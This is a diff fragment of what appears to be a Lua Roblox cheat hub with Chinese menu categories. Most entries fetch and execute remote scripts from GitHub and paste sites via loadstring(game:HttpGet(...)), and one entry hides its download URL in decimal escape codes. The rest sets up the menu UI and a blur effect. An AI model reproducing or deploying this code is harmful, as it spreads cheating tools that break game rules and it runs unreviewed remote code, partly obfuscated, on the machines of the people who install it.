+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TirSANX/CrimsonHUB/main/C_Loader'))()
+end)
+
+addFunctionToCategory("bf", "脚本2", "bf脚本2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/OldBf"))()
+end)
+
+-- 彩虹朋友
+addFunctionToCategory("彩虹朋友", "彩虹朋友", "彩虹朋友脚本", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Sempiller/RainbowTool/main/Turkish.lua'))()
+end)
+
+addFunctionToCategory("彩虹朋友", "彩虹朋友2", "彩虹朋友脚本2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Rainbow-Friends/main/Rainbow%20Friends"))()
+end)
+
+-- 内脏与黑火药
+addFunctionToCategory("内脏与黑火药", "内脏与黑火药1", "内脏与黑火药脚本1", function()
+    loadstring(game:HttpGet("https://shz.al/~KSKKS"))()
+end)
+
+addFunctionToCategory("内脏与黑火药", "内脏与黑火药2", "内脏与黑火药脚本2", function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\102\114\101\101\110\111\116\101\46\98\105\122\47\114\97\119\47\109\117\122\110\104\101\114\104\114\117\34\41\44\116\114\117\101\41\41\40\41\10")()
+end)
+
+-- 幸运方块
+addFunctionToCategory("幸运方块", "脚本1", "幸运方块脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PlanetHubX/Lucky-Blocks/main/source", true))()
+end)
+
+-- 造船寻宝
+addFunctionToCategory("造船寻宝", "脚本1", "造船寻宝脚本", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
+end)
+
+addFunctionToCategory("造船寻宝", "无限方块", "无限方块功能", function()
+    spawn(function()
+        local guiinf = game:GetService("Players").LocalPlayer.PlayerGui.BuildGui.InventoryFrame.ScrollingFrame.BlocksFrame
+        _G.Blocks = false
+        while game:GetService("RunService").RenderStepped:wait() do
+            if _G.Blocks then return end
+            for i,v in pairs(guiinf:GetDescendants()) do
+                if v.Name == "AmountText" then
+                    v.Text = math.huge
+                end
+            end
+        end
+    end)
+end)
+
+-- 进击的僵尸
+addFunctionToCategory("进击的僵尸", "进击的僵尸", "进击的僵尸脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Zombie%20Attack", true))()
+end)
+
+-- 战斗勇士
+addFunctionToCategory("战斗勇士", "脚本1", "战斗勇士脚本1", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
+end)
+
+addFunctionToCategory("战斗勇士", "脚本2", "战斗勇士脚本2", function()
+    loadstring(game:HttpGet("https://paste.gg/p/anonymous/697fc3cad5f743508318cb7399e89432/files/b5923e52edab4e5c91e46b74563d0ae8/raw"))()
+end)
+
+-- 鲨口求生2
+addFunctionToCategory("鲨口求生2", "自动杀鲨鱼", "自动杀鲨鱼功能", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Misc%20Scripts/sharkbite2.lua",true))()
+end)
+
+-- ==================== 最终设置 ====================
+-- 更新容器大小
+updateContainerSize()
+
+-- 设置默认分类为"全部"
+for _, btn in ipairs(categoryScroll:GetChildren()) do
+    if btn:IsA("TextButton") and btn.Text == "全部" then
+        btn.BackgroundTransparency = 0.1
+        btn.BackgroundColor3 = Color3.fromRGB(
+            math.clamp(currentColors.Accent.R * 0.8, 0, 1),
+            math.clamp(currentColors.Accent.G * 0.8, 0, 1),
+            math.clamp(currentColors.Accent.B * 0.8, 0, 1)
+        )
+    end
+end
+
+-- 设置分类过滤
+setupCategoryFilter()
+
+-- 添加模糊效果
+local blur = Instance.new("BlurEffect")
+blur.Size = 24
+blur.Name = "UIBlur"
+blur.Parent = game:GetService("Lighting")
+
+-- 当UI关闭时移除模糊
+screenGui.DescendantRemoving:Connect(function()
+    if blur then
+        blur:Destroy()
+    end
+end)
